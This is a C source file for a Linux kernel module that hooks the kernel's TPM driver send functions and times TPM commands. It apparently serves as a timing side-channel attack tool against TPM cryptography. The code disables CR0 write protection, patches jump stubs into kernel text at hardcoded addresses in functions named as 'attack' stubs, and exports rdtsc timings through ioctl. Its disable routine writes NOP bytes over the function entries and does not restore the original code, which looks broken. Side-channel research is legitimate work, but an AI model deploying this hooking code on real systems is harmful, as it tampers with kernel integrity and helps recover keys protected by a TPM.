#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include "tpmttl.h"


unsigned long long pcrb_send     = 0xffffffff81641a20;
unsigned long long ptpm_tcg_write_bytes = 0xffffffff81640b60;



unsigned char nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
unsigned char call_stub[] = {0xe8, 0xf1, 0xf2, 0xf3, 0xf4};
unsigned char  jmp_stub[] = {0xe9, 0xf1, 0xf2, 0xf3, 0xf4};

enum crb_ctrl_req {
  CRB_CTRL_REQ_CMD_READY = BIT(0),
  CRB_CTRL_REQ_GO_IDLE	 = BIT(1),
};

struct crb_regs_tail {
  u32 ctrl_req;
  u32 ctrl_sts;
  u32 ctrl_cancel;
  u32 ctrl_start;
  u32 ctrl_int_enable;
  u32 ctrl_int_sts;
  u32 ctrl_cmd_size;
  u32 ctrl_cmd_pa_low;
  u32 ctrl_cmd_pa_high;
  u32 ctrl_rsp_size;
  u64 ctrl_rsp_pa;
} __packed;

struct fake_crb_priv {	
  u8 junk[0x20];
  struct crb_regs_tail __iomem *regs_t;
  u8 __iomem *cmd;
  u8 __iomem *rsp;
  u32 cmd_size;
  u32 smc_func_id;
};

struct fake_chip {
  u8 junk[0x98];
  struct crb_priv * priv;
  u8 junk2[0x640];
  unsigned int flags;
};

struct fake_crb_priv * g_priv;
struct fake_chip * g_chip;

enum tis_status {
  TPM_STS_VALID         = 0x80,
  TPM_STS_COMMAND_READY = 0x40,
  TPM_STS_GO            = 0x20,
  TPM_STS_DATA_AVAIL    = 0x10,
  TPM_STS_DATA_EXPECT   = 0x08,
};

struct tpm_tis_phy_ops {
  int (*read_bytes)(struct tpm_tis_data *data, u32 addr, u16 len, u8 *result);
  int (*write_bytes)(struct tpm_tis_data *data, u32 addr, u16 len, const u8 *value);
  int (*read16)(struct tpm_tis_data *data, u32 addr, u16 *result);
  int (*read32)(struct tpm_tis_data *data, u32 addr, u32 *result);
  int (*write32)(struct tpm_tis_data *data, u32 addr, u32 src);
};

struct tpm_tis_data {
  u16 manufacturer_id;
  int locality;
  int irq;
  bool irq_tested;
  unsigned int flags;
  void __iomem *ilb_base_addr;
  u16 clkrun_enabled;
  wait_queue_head_t int_queue;
  wait_queue_head_t read_queue;
  const struct tpm_tis_phy_ops *phy_ops;
};

struct tpm_tis_tcg_phy {
  struct tpm_tis_data priv;
  void __iomem *iobase;
};



enum crb_start {
  CRB_START_INVOKE = BIT(0),
};


static noinline int internal_crb_send_handler(uint64_t * chip, u8 *buf, size_t len);
static int crb_send_handler(uint64_t * chip, u8 *buf, size_t len);

static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value);
static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value);

unsigned long long tscrequest[1000] = {0};
unsigned long long requestcnt = 0;


static void enable_attack_stub()
{
  requestcnt = 0;
  
  unsigned int target_addr;  
  write_cr0 (read_cr0 () & (~ 0x10000));

  target_addr = crb_send_handler - pcrb_send - 5;  
  jmp_stub[1] = ((char*)&target_addr)[0];
  jmp_stub[2] = ((char*)&target_addr)[1];
  jmp_stub[3] = ((char*)&target_addr)[2];
  jmp_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)pcrb_send, jmp_stub, sizeof(jmp_stub));

  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
  jmp_stub[1] = ((char*)&target_addr)[0];
  jmp_stub[2] = ((char*)&target_addr)[1];
  jmp_stub[3] = ((char*)&target_addr)[2];
  jmp_stub[4] = ((char*)&target_addr)[3];
  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));

  write_cr0 (read_cr0 () | 0x10000);
 
  printk("TPMTTL: ENABLED\n");
}

#define	TPM_STS(l)			(0x0018 | ((l) << 12))

enum tpm_chip_flags {
  TPM_CHIP_FLAG_REGISTERED	= BIT(0),
  TPM_CHIP_FLAG_TPM2		= BIT(1),
  TPM_CHIP_FLAG_IRQ		= BIT(2),
  TPM_CHIP_FLAG_VIRTUAL		= BIT(3),
};


static void disable_attack_stub()
{  
  write_cr0 (read_cr0 () & (~ 0x10000));
  memcpy((void*)pcrb_send, nop_stub, sizeof(nop_stub));  
  memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
  write_cr0 (read_cr0 () | 0x10000);
  printk("TPMTTL: DISABLED\n");
}


static long ioctl_uninstall_timer(struct file *filep,
  unsigned int cmd, unsigned long arg){
  disable_attack_stub();
  return 0;
}

static long ioctl_install_timer(struct file *filep,
  unsigned int cmd, unsigned long arg){
  enable_attack_stub();
  return 0;
}

static long ioctl_read(struct file *filep,
  unsigned int cmd, unsigned long arg){
  
  struct tpmttl_generic_param * param;
  param = (struct tpmttl_generic_param *) arg;
  memcpy(param->ttls, tscrequest, 1000 * sizeof(unsigned long long));
  param->cnt = requestcnt;


  printk(KERN_ALERT "TPMTTL: requestcnt %lu\n", requestcnt);
  requestcnt = 0;

  return 0;
}


typedef long (*tpmttl_ioctl_t)(struct file *filep,
	unsigned int cmd, unsigned long arg);



long tpmttl_ioctl(struct file *filep, unsigned int cmd, 
	unsigned long arg)
{
  struct tpmttl_generic_param data;
  long ret;
  
  tpmttl_ioctl_t handler = NULL;

  switch (cmd) {    
    case TPMTTL_IOCTL_UNINSTALL_TIMER:
      handler = ioctl_uninstall_timer;
      break;	
    case TPMTTL_IOCTL_INSTALL_TIMER:
      handler = ioctl_install_timer;
      break;	
    case TPMTTL_IOCTL_READ:
      handler = ioctl_read;
      break;  
    default:
      return -EINVAL;
  }
  
  if (copy_from_user(&data, (void __user *) arg, _IOC_SIZE(cmd)))
    return -EFAULT;

  ret = handler(filep, cmd, (unsigned long) ((void *) &data));

  if (!ret && (cmd & IOC_OUT)) {
    if (copy_to_user((void __user *) arg, &data, _IOC_SIZE(cmd)))
      return -EFAULT;
  }
  return ret;
}



static const struct file_operations tpmttl_fops = {
  .owner = THIS_MODULE,
  .unlocked_ioctl = tpmttl_ioctl,
};

static struct miscdevice tpmttl_miscdev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "tpmttl",
  .fops = &tpmttl_fops,
};

static noinline int internal_tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value)
{
  unsigned long i, t;
  struct tpm_tis_tcg_phy *phy = container_of(data, struct tpm_tis_tcg_phy, priv);
  if(len == 1 && *value == TPM_STS_GO && TPM_STS(data->locality) == addr)
  {
    wmb();
    t = rdtsc();
    rmb();
    iowrite8(*value, phy->iobase + addr);

    while(!(ioread8(phy->iobase + addr) & TPM_STS_DATA_AVAIL));
    
    rmb();

    tscrequest[requestcnt++] = rdtsc() - t;
  
  }
  else{
    while (len--)
      iowrite8(*value++, phy->iobase + addr);
  }
  return 0;
}

static int tpm_tcg_write_bytes_handler(struct tpm_tis_data *data, u32 addr, u16 len, u8 *value)
{
  return internal_tpm_tcg_write_bytes_handler(data, addr, len, value);
}

static noinline int internal_crb_send_handler(uint64_t * chip, u8 *buf, size_t len){
  unsigned long t;
  int rc = 0;
  asm volatile("mov %%rdi, %%r8;": : : "%r8");
  asm volatile("mov %%rsi, %%r9;": : : "%r9");

  g_chip = chip;
  g_priv = g_chip->priv;
  
  iowrite32(0, &g_priv->regs_t->ctrl_cancel);

  memcpy_toio(g_priv->cmd, buf, len);

  wmb();
  t = rdtsc();
  rmb();
  
  iowrite32(CRB_START_INVOKE, &g_priv->regs_t->ctrl_start);
  
  while((ioread32(&g_priv->regs_t->ctrl_start) & CRB_START_INVOKE) ==
	    CRB_START_INVOKE);
  rmb();

  tscrequest[requestcnt++] = rdtsc() - t;
  
  asm volatile("mov %%r8, %%rdi;": : : "%r8");
  asm volatile("mov %%r9, %%rsi;": : : "%r9");

  return rc;
}

static int crb_send_handler(uint64_t * chip, u8 *buf, size_t len)
{
  return internal_crb_send_handler(chip, buf, len);
} 


static int tpmttl_init(void)
{
  int ret;
  printk(KERN_ALERT "TPMTTL: HELLO\n");

  ret = misc_register(&tpmttl_miscdev);
  if (ret) {
    printk(KERN_ERR "cannot register miscdev(err=%d)\n", ret);
    return ret;
  }

   
  return 0;
}


static void tpmttl_exit(void)
{ 
	// Turn off the timer hooks before leaving
  disable_attack_stub();

  // Remove the misc device
  misc_deregister(&tpmttl_miscdev);  

  printk(KERN_ALERT "TPMTTL: BYE\n");
}


module_init(tpmttl_init);
module_exit(tpmttl_exit);
MODULE_LICENSE("GPL");
